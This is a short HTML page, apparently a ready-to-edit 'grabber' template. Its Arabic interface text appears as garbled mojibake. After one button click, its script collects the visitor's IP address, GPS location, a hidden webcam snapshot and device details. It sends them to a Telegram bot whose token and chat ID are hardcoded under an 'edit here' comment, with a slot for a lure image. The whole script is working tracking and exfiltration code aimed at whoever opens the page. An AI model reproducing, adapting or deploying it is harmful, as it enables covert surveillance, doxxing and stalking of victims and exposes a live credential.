<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>ููุงููุฉ</title>
<style>
body {
  font-family: Arial;
  text-align: center;
  margin-top: 40px;
}
img {
  width: 220px;
  display: block;
  margin: 20px auto;
}
button {
  padding: 10px 20px;
  font-size: 16px;
}
</style>
</head>
<body>

<h3>๐ธ ุณูุชู ุงูุชูุงุท ุตูุฑุฉ ุจุนุฏ ููุงููุชู</h3>
<p>ูุณูุชู ุฅุฑุณุงููุง ูุน ุงููููุน ูููุน ุงูุฌูุงุฒ.</p>

<!-- ๐ฝ ุถุน ุฑุงุจุท ุงูุตูุฑุฉ ููุง -->
<img src="https://ugc.production.linktr.ee/33eeaee9-a676-4312-b3bc-768c4266ef01_IMG-2923.webp?io=true&size=avatar-v3_0" alt="ุตูุฑุฉ">

<button onclick="start()">ููุงูู</button>

<canvas id="canvas" style="display:none;"></canvas>

<script>
/* ๐ง ุนุฏูู ููุง */
const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
const CHAT_ID  = "6251932709";

async function start() {
  try {
    // ๐ IP
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    const ip = ipData.ip;

    // ๐ ุงููููุน
    navigator.geolocation.getCurrentPosition(async pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      // ๐ธ ุงููุงููุฑุง (ุจุฏูู ูุนุงููุฉ)
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      const canvas = document.getElementById("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      const imageBase64 = canvas.toDataURL("image/png");
      stream.getTracks().forEach(t => t.stop());

      // ๐ฑ ููุน ุงูุฌูุงุฒ
      const device = navigator.userAgent;

      const text = `
๐ธ ุตูุฑุฉ ุฌุฏูุฏุฉ
๐ ุงููููุน: ${lat}, ${lon}
๐ IP: ${ip}
๐ฑ ุงูุฌูุงุฒ: ${device}
      `;

      // ๐ฉ ุฅุฑุณุงู ุงููุต
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      });

      // ๐ท ุฅุฑุณุงู ุงูุตูุฑุฉ
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          photo: imageBase64
        })
      });

      alert("โ ุชู ุงูุฅุฑุณุงู");

    }, () => alert("โ ุชู ุฑูุถ ุงููููุน"));

  } catch (e) {
    alert("โ ุญุฏุซ ุฎุทุฃ");
  }
}
</script>

</body>
</html>